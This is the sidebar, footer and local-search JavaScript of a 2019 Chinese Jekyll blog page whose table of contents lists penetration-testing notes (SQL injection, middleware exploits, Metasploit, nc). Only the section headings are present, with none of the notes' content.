</ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-15"> <span class="nav-number">15</span> <span class="nav-text">15 Docker使用</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-15-1"> <span class="nav-number">15.1</span> <span class="nav-text">15.1 docker基本命令</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-15-2"> <span class="nav-number">15.2</span> <span class="nav-text">15.2 docker给运行中的容器添加映射端口</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-15-3"> <span class="nav-number">15.3</span> <span class="nav-text">15.3 Docker remote api</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-15-4"> <span class="nav-number">15.4</span> <span class="nav-text">15.4 Dcos</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-16"> <span class="nav-number">16</span> <span class="nav-text">16 Mysql使用</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-16-1"> <span class="nav-number">16.1</span> <span class="nav-text">16.1 mysql常用命令</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-16-2"> <span class="nav-number">16.2</span> <span class="nav-text">16.2 sql注入</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-17"> <span class="nav-number">17</span> <span class="nav-text">17 在信息安全中常用工具</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-1"> <span class="nav-number">17.1</span> <span class="nav-text">17.1 wireshark使用</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-2"> <span class="nav-number">17.2</span> <span class="nav-text">17.2 查看文件的md5值</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-3"> <span class="nav-number">17.3</span> <span class="nav-text">17.3 http流量</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-17-3-1"> <span class="nav-number">17.3.1</span> <span class="nav-text">17.3.1 http PUT方法</span> </a> </li> </ol> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-4"> <span class="nav-number">17.4</span> <span class="nav-text">17.4 操作系统</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-5"> <span class="nav-number">17.5</span> <span class="nav-text">17.5 数据库</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-17-6"> <span class="nav-number">17.6</span> <span class="nav-text">17.6 文件分析软件</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-18"> <span class="nav-number">18</span> <span class="nav-text">18 常用中间件管理地址及默认帐号及漏洞利用</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-18-1"> <span class="nav-number">18.1</span> <span class="nav-text">18.1 windows常用命令</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-18-2"> <span class="nav-number">18.2</span> <span class="nav-text">18.2 Weblogic</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-18-3"> <span class="nav-number">18.3</span> <span class="nav-text">18.3 Tomcat</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-18-4"> <span class="nav-number">18.4</span> <span class="nav-text">18.4 Jboos</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-18-5"> <span class="nav-number">18.5</span> <span class="nav-text">18.5 IIS漏洞使用</span> </a> </li> </ol> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-19"> <span class="nav-number">19</span> <span class="nav-text">19 日志分析</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-20"> <span class="nav-number">20</span> <span class="nav-text">20 工具使用实验</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-1"> <span class="nav-number">20.1</span> <span class="nav-text">20.1 nc软件使用</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-2"> <span class="nav-number">20.2</span> <span class="nav-text">20.2 通过mysql服务向web目录读写文件</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-3"> <span class="nav-number">20.3</span> <span class="nav-text">20.3 IIS put漏洞使用</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-4"> <span class="nav-number">20.4</span> <span class="nav-text">20.4 Metasploit 渗透Windos7</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-5"> <span class="nav-number">20.5</span> <span class="nav-text">20.5 .cgi为文件后缀名漏洞使用</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-20-6"> <span class="nav-number">20.6</span> <span class="nav-text">20.6 jboss java反序列化工具使用</span> </a> </li> </ol> </li>
    </ol>
  </div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>

        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jsf</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://jekyllrb.com">Jekyll</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">
    NexT.Mist
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>





















  
   
  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  
  
  
  
  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>



  
  

  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>


  


  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>



  


  




	





  











  




  

    

  







  


  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
  


  

  

  

</body>
</html>

